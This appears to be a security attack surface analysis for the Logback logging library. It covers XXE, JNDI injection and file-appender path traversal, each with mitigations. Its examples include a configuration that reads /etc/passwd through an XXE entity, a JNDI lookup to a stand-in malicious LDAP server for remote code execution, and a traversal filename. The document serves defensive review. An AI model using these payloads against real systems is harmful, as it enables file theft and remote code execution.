# Attack Surface Analysis for qos-ch/logback

## Attack Surface: [XML External Entity (XXE) Injection](./attack_surfaces/xml_external_entity__xxe__injection.md)

*   **Description:** Attackers exploit vulnerabilities in XML parsers to inject malicious external entities within XML configuration files processed by Logback. This can lead to reading local files, Server-Side Request Forgery (SSRF), or Denial of Service (DoS).
*   **Logback Contribution:** Logback directly uses XML parsing to process its configuration files (`logback.xml`, `logback-spring.xml`). If external entity processing is enabled in the XML parser used by Logback, and these configuration files are from untrusted sources or modifiable by attackers, XXE vulnerabilities are directly introduced by Logback's configuration mechanism.
*   **Example:** An attacker provides a malicious `logback.xml` file to be loaded by the application. This file contains an external entity definition that attempts to read a local sensitive file:

    ```xml
    <!DOCTYPE logback [
      <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <configuration>
      <appender name="STDOUT" class="ch.qos.logback.core.ConsoleAppender">
        <encoder>
          <pattern>%d{HH:mm:ss.SSS} [%thread] %-5level %logger{36} - %msg %n &xxe;</pattern>
        </encoder>
      </appender>
      <root level="INFO">
        <appender-ref ref="STDOUT" />
      </root>
    </configuration>
    ```
    When Logback parses this configuration, it may attempt to resolve the external entity `&xxe;`, potentially exposing the content of `/etc/passwd` or causing errors that reveal file existence.
*   **Impact:** Confidentiality breach (reading local files), SSRF, DoS.
*   **Risk Severity:** **High** to **Critical** (depending on the impact of file access or SSRF).
*   **Mitigation Strategies:**
    *   **Disable XML External Entity Processing in XML Parser:** Ensure the XML parser used by Logback has XML external entity processing explicitly disabled. Verify this configuration based on the specific XML parsing library and Java version in use.
    *   **Secure Logback Configuration File Sources:** Load `logback.xml` and `logback-spring.xml` only from trusted and controlled locations. Prevent loading configuration files from user-provided paths or untrusted network locations.
    *   **Restrict Access to Logback Configuration Files:** Implement strict access controls to prevent unauthorized modification or replacement of Logback configuration files.

## Attack Surface: [JNDI Injection via Configuration Properties](./attack_surfaces/jndi_injection_via_configuration_properties.md)

*   **Description:** Attackers exploit Java Naming and Directory Interface (JNDI) lookup capabilities within Logback configuration properties. If Logback configuration properties are sourced from untrusted input or are modifiable, attackers can inject malicious JNDI URLs, potentially leading to Remote Code Execution (RCE).
*   **Logback Contribution:** Logback's property substitution mechanism allows referencing JNDI resources within configuration files. This feature, when combined with the ability to influence configuration properties through external input, directly enables JNDI injection vulnerabilities within Logback configurations.
*   **Example:** An attacker injects a malicious JNDI URL into a system property or environment variable that is then used in `logback.xml` for property substitution:

    ```xml
    <configuration>
      <property name="logging.dir" value="${jndi:ldap://malicious-server.com/Exploit}" />
      <appender name="FILE" class="ch.qos.logback.core.FileAppender">
        <file>${logging.dir}/application.log</file>
        <encoder>
          <pattern>%msg%n</pattern>
        </encoder>
      </appender>
      </root>
    </configuration>
    ```
    If the application loads this configuration and the `${logging.dir}` property is resolved, Logback will initiate a JNDI lookup to `ldap://malicious-server.com/Exploit`. This can lead to RCE if the malicious server provides a payload to execute.
*   **Impact:** Remote Code Execution (RCE).
*   **Risk Severity:** **Critical**.
*   **Mitigation Strategies:**
    *   **Disable JNDI Lookup Functionality:** If JNDI lookup is not a required feature, disable it entirely within the application or Logback configuration.  (Note: Recent Java and Logback versions include mitigations, but disabling is still the most effective approach if JNDI is not needed).
    *   **Sanitize and Validate Configuration Properties:**  Thoroughly sanitize and validate any external input used to set Logback configuration properties (e.g., system properties, environment variables). Avoid using untrusted sources for these properties.
    *   **Restrict Access to Configuration Property Sources:** Control access to mechanisms that can set Logback configuration properties, limiting modification to trusted administrators or processes.
    *   **Use Secure Java and Logback Versions:** Ensure the application uses Java and Logback versions that incorporate security patches and mitigations against JNDI injection vulnerabilities.

## Attack Surface: [File System Path Traversal via File Appenders](./attack_surfaces/file_system_path_traversal_via_file_appenders.md)

*   **Description:**  Misconfiguration of Logback file appenders, particularly when file paths are constructed using external or insufficiently validated input, can lead to path traversal vulnerabilities. This allows writing log files to arbitrary locations on the file system, potentially overwriting critical files or gaining access to restricted directories.
*   **Logback Contribution:** Logback's `FileAppender` and related appenders directly interact with the file system based on the configured file paths. If these paths are dynamically constructed using external input without proper validation, Logback's file writing functionality becomes the vector for path traversal attacks.
*   **Example:** An application allows specifying a log file name through a configuration property that is not properly validated for path traversal sequences:

    ```xml
    <configuration>
      <property name="log.filename" value="${userInputLogFilename}" />
      <appender name="FILE" class="ch.qos.logback.core.FileAppender">
        <file>/var/log/${log.filename}.log</file>
        </appender>
      </configuration>
    ```
    If `userInputLogFilename` is set to `../../../../tmp/malicious_log`, Logback might attempt to create and write logs to `/var/log/../../../../tmp/malicious_log`, effectively writing to `/tmp/malicious_log` due to path traversal. In more severe cases, attackers might attempt to overwrite configuration files or other sensitive system files if write permissions allow.
*   **Impact:** File system manipulation, potential for overwriting critical files, information disclosure if logs are written to accessible locations, potential for escalated attacks.
*   **Risk Severity:** **High** (can be Critical depending on the ability to overwrite critical system files or gain privileged access).
*   **Mitigation Strategies:**
    *   **Avoid User-Controlled File Paths for Appenders:**  Do not construct file paths for Logback file appenders using any form of user-provided or external input.
    *   **Use Absolute Paths or Whitelisted Directories:** Configure file appenders to use absolute file paths or restrict file paths to a predefined whitelist of safe directories.
    *   **Strict Input Validation and Sanitization (If Dynamic Paths are Necessary):** If dynamic file path construction is absolutely required, implement rigorous input validation and sanitization to prevent path traversal sequences (e.g., `../`, `..\`).
    *   **Principle of Least Privilege for Application Process:** Run the application process with the minimum file system write permissions necessary to limit the potential impact of path traversal vulnerabilities.

